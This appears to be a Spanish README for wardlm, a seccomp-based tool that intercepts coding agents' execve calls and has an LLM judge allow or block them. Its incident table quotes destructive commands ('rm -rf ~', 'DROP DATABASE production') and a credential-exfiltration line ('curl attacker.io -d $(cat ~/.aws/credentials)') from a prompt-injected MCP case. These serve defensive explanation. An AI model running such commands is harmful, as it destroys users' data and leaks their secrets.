# wardlm

> Capa de seguridad a nivel sistema operativo para agentes.

**wardlm** es una capa de defensa para agentes de IA (Claude Code, Codex, Cursor, Gemini CLI, Copilot, opencode, openclaw, y otros) que utiliza el subsistema de Linux `seccomp` para interceptar cada syscall `execve` y `execveat` que un agente intenta ejecutar, lo clasifica a través de un llamado a una LLM, y solo permite continuar la syscall si el comando es seguro. Si es peligroso, el kernel devuelve `-EACCES` y el agente recibe el error como cualquier otro fallo de permisos.

La hipótesis es simple: **la seguridad se construye en capas**. Los harnesses de los agentes ya tienen sus propios clasificadores a nivel aplicación, pero esa frontera no es suficiente. wardlm aporta la defensa que falta en el stack: una que vive debajo del agente, en el sistema operativo, y que no puede ser eludida por un prompt injection o un MCP comprometido.

---

## El problema: incidentes reales, herramientas que ya usás

Los agentes de coding ya causaron incidentes destructivos en producción. Son casos públicos, documentados, recientes.

| INC | Fecha | Agente | Comando | Fuente |
|-----|-------|--------|---------|-----------|
| INC-001 | Dic 2025 | Cursor | `rm -rf ~` | ([Cursor Forum #129401](https://forum.cursor.com/t/claude-deleted-my-entire-home-directory/129401)) |
| INC-002 | Mar 2026 | Claude Code | `rm -rf ./app ./components ./lib` | ([GitHub Issues #37331](https://github.com/anthropics/claude-code/issues/37331)) |
| INC-003 | Jul 2025 | Replit Agent | `DROP DATABASE production` | ([HN #44632270](https://news.ycombinator.com/item?id=44632270)) |
| INC-004 | Ago 2025 | Cursor + Jira MCP | `curl attacker.io -d $(cat ~/.aws/credentials)` | ([Snyk Labs](https://labs.snyk.io/resources/cursor-jira-mcp-vulnerability-explained/)) |

El patrón es consistente:

- Los **clasificadores en el harness fallan** porque dependen del contexto que les pasa el agente, y ese contexto puede estar contaminado (prompt injection, datos externos, MCPs comprometidos).
- **Los modos `--yolo` o auto-accept existen** porque el desarrollador necesita avanzar sin fricción. Eston son la norma para los power users, no la excepción.
- Una vez que el agente decide ejecutar, **no hay una segunda barrera** entre la decisión y el daño.

wardlm es esa segunda barrera.

---

## Arquitectura

### Vista general

```
agentes (Claude Code, Codex, Cursor, Gemini CLI, Copilot, opencode, ...)
        │
        │  execve('/bin/bash', 'rm -rf /')
        ▼
┌─────────────────────────────────────────────┐
│  Linux Kernel — seccomp / BPF filter        │
│  Aplicado solo a procesos del agente.       │
│  Cada execve queda suspendido.              │
└─────────────────────────────────────────────┘
        │  SECCOMP_RET_USER_NOTIF
        ▼
┌─────────────────────────────────────────────┐
│  wardlm · userspace                         │
│  LLM judge — approve / deny                 │
│  Clasificador binario por execve.           │
│  ~300ms de overhead.                        │----┐
└─────────────────────────────────────────────┘    │
        │  NOTIF_SEND  →  CONTINUE | -EACCES       │
        ▼                                          │
┌─────────────────────────────────────────────┐    │  ┌─────────────────────────────────────────────┐
│  execve() resume:  aprobado | -EACCES       │    └▶ │  Escribe a /var/log para luego poder        │
└─────────────────────────────────────────────┘       │  visualizar esta info en nuestra GUI        │
                                                      │  (Electron)                                 │   
                                                      └─────────────────────────────────────────────┘
```

### Camino crítico de una syscall

1. El agente ejecuta `execve('/bin/bash', 'rm -rf /')`.
2. El kernel evalúa el filtro BPF cargado por wardlm y devuelve `SECCOMP_RET_USER_NOTIF`. La syscall queda **suspendida** — todavía no se ejecuta.
3. wardlm en userspace recibe la notificación, arma el contexto (binario, args, cwd, agente que lo originó), y lo envía al LLM judge.
4. El LLM responde **approve** o **deny**. wardlm hace `NOTIF_SEND` con `CONTINUE` (aprobado) o `-EACCES` (denegado).
5. El kernel resume el `execve`: o bien lo deja correr, o bien lo aborta con `EACCES` y el agente recibe el error como un fallo de permisos cualquiera. También escribe en stderr del proceso por qué rechazó el comando para que el agente pueda utilizar esa información.
6. La decisión queda escrita en `/var/log/wardlm` y la app de Electron la muestra en tiempo real para auditoría.

### Por qué seccomp y user-notif

- **`seccomp`** (`Secure Computing Mode`) es el mecanismo del kernel de Linux para filtrar syscalls. Está disponible en kernel 5.8+ y no requiere módulos custom ni drivers.
- **`SECCOMP_RET_USER_NOTIF`** permite delegar el veredicto a un proceso de userspace **antes** de que la syscall se ejecute. Esto es lo que habilita un "antivirus síncrono" sobre `execve`: el comando no corre hasta que wardlm responde.
- **El filtro se aplica solo a los procesos del agente** (vía shims). El resto del sistema operativo no se ve afectado y no hay overhead global.

### Componentes

#### 1. C core (`wardlm/`)

El núcleo en C que carga el filtro BPF, escucha el file descriptor de seccomp, dispatchea cada notificación al clasificador y emite el veredicto. Layout:

- `src/main.c` — entrypoint y wiring.
- `src/filter.c` — instalación del filtro BPF (qué syscalls interceptar, cómo).
- `src/notif_loop.c` — loop principal de `SECCOMP_IOCTL_NOTIF_*`.
- `src/policy.c` — política de decisión: cuándo consultar al LLM, cuándo hay un veredicto cacheado.
- `src/anthropic.c` — cliente HTTP para la Claude API.
- `src/fd_passing.c` — paso del seccomp fd entre procesos vía SCM_RIGHTS.
- `src/log.c` — escritura a `/var/log/wardlm` para la app Electron.
- `src/remote.c`, `src/settings.c` — config y endpoints opcionales.

#### 2. Shims por agente (`shim/`)

Pequeños binarios wrapper que sustituyen al ejecutable del agente en el `PATH` y arrancan el target real bajo el filtro seccomp de wardlm. Hoy hay shims para:

- `claude` (Claude Code)
- `codex` (OpenAI Codex CLI)
- `cursor-agent` (Cursor)
- `copilot` (GitHub Copilot CLI)
- `gemini` (Gemini CLI)
- `goose`
- `crewai`, `metagpt`, `manus`
- `opencode`, `openclaw`
- `amp`

Esto es lo que hace que wardlm sea **opt-in por agente**: si lanzás `claude` desde tu terminal, levanta protegido, pero no afecta a otros programas.

#### 3. App de Electron (`wardlm-electron/`)

Cliente de auditoría en tiempo real. Lee `/var/log/wardlm`, muestra cada decisión (allow/deny), permite filtrar por agente, comando o veredicto, y exponer estadísticas. Sirve también como UI de configuración para `~/.config/wardlm/settings.json`.

#### 4. Landing (`wardlm-landing/`)

Sitio en Next.js que aloja `install.sh` y la documentación pública. Deploy: <https://wardlm.vercel.app/>.

---

## El LLM judge

Cada `execve` interceptado se manda a Claude (vía la Anthropic API) con un contexto estructurado:

- Binario y argumentos completos.
- Agente que originó la llamada.
- `cwd`, usuario, variables de entorno relevantes.
- Política configurada por el usuario (qué considera "seguro" su entorno).

El modelo devuelve un veredicto binario — **approve** o **deny** — más una etiqueta corta de la categoría del riesgo (ej. `sql_database_destruction`, `credential_exfiltration`, `home_directory_wipe`). Esa etiqueta es la que ve el usuario en el log y en la UI.

Overhead típico: ~300ms por syscall interceptada. Como el filtro solo se aplica a procesos del agente y la mayoría de sus comandos son benignos, el costo en una sesión real es despreciable comparado con el tiempo del propio agente generando la decisión.

---

## Instalación

Actualmente solo empaquetamos .deb, pero debería funcionar para cualquier distro de Linux con versión de kernel mayor a 5.8

```bash
curl -fsSL https://wardlm.vercel.app/install.sh | bash
```
